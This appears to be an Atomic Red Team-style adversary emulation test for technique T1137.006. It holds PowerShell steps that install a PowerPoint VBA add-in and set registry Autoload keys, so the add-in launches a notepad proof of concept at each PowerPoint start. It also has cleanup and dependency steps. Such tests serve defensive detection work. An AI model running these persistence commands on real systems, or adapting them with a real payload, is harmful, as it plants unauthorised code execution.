{
  "id": "f89e58f9-2b49-423b-ac95-1f3e7cfd8277",
  "name": "Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)",
  "description": "Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started\nThe sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "91f86e15-fe71-4427-ae78-babbaf390204",
      "type": "execute-command",
      "data": {
        "command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "dfde78e9-3267-40dc-869d-f375b24bc9c7",
      "type": "execute-command",
      "data": {
        "command": "$ver = (New-Object -COMObject \"PowerPoint.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"PowerPnt\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.ppam\"  -ErrorAction Ignore",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "bc5460e6-8556-4d86-8ff5-f3b8c71c3ca0",
      "name": "Check dependency 1/2",
      "description": "Microsoft Excel must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"PowerPoint.Application\" | Out-Null\n  Stop-Process -Name \"PowerPnt\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7df4e696-9407-485f-831f-fcc34eef1977",
      "name": "Resolve dependency 1/2",
      "description": "Microsoft Excel must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft PowerPoint manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "dcac2473-5539-413e-8763-fa78da30b70a",
      "name": "Re-check dependency 1/2",
      "description": "Microsoft Excel must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"PowerPoint.Application\" | Out-Null\n  Stop-Process -Name \"PowerPnt\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "22fccaaa-c760-4a93-bec2-5509fbb6ef11",
      "name": "Check dependency 2/2",
      "description": "PPAM file must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c5ac3bd6-b436-472d-ae3a-ab6ae2bfc199",
      "name": "Resolve dependency 2/2",
      "description": "PPAM file must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\"",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "403d6023-3b71-453c-ad5b-f0fcfff03cd7",
      "name": "Re-check dependency 2/2",
      "description": "PPAM file must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "91f86e15-fe71-4427-ae78-babbaf390204",
      "p": "on-success",
      "o": "dfde78e9-3267-40dc-869d-f375b24bc9c7"
    },
    {
      "s": "91f86e15-fe71-4427-ae78-babbaf390204",
      "p": "on-failure",
      "o": "dfde78e9-3267-40dc-869d-f375b24bc9c7"
    },
    {
      "s": "bc5460e6-8556-4d86-8ff5-f3b8c71c3ca0",
      "p": "on-success",
      "o": "91f86e15-fe71-4427-ae78-babbaf390204"
    },
    {
      "s": "bc5460e6-8556-4d86-8ff5-f3b8c71c3ca0",
      "p": "on-failure",
      "o": "7df4e696-9407-485f-831f-fcc34eef1977"
    },
    {
      "s": "7df4e696-9407-485f-831f-fcc34eef1977",
      "p": "on-success",
      "o": "dcac2473-5539-413e-8763-fa78da30b70a"
    },
    {
      "s": "dcac2473-5539-413e-8763-fa78da30b70a",
      "p": "on-failure",
      "o": "91f86e15-fe71-4427-ae78-babbaf390204"
    },
    {
      "s": "22fccaaa-c760-4a93-bec2-5509fbb6ef11",
      "p": "on-success",
      "o": "91f86e15-fe71-4427-ae78-babbaf390204"
    },
    {
      "s": "22fccaaa-c760-4a93-bec2-5509fbb6ef11",
      "p": "on-failure",
      "o": "c5ac3bd6-b436-472d-ae3a-ab6ae2bfc199"
    },
    {
      "s": "c5ac3bd6-b436-472d-ae3a-ab6ae2bfc199",
      "p": "on-success",
      "o": "403d6023-3b71-453c-ad5b-f0fcfff03cd7"
    },
    {
      "s": "403d6023-3b71-453c-ad5b-f0fcfff03cd7",
      "p": "on-failure",
      "o": "91f86e15-fe71-4427-ae78-babbaf390204"
    }
  ],
  "tags": [
    "T1137.006",
    "atomic-red-team"
  ]
}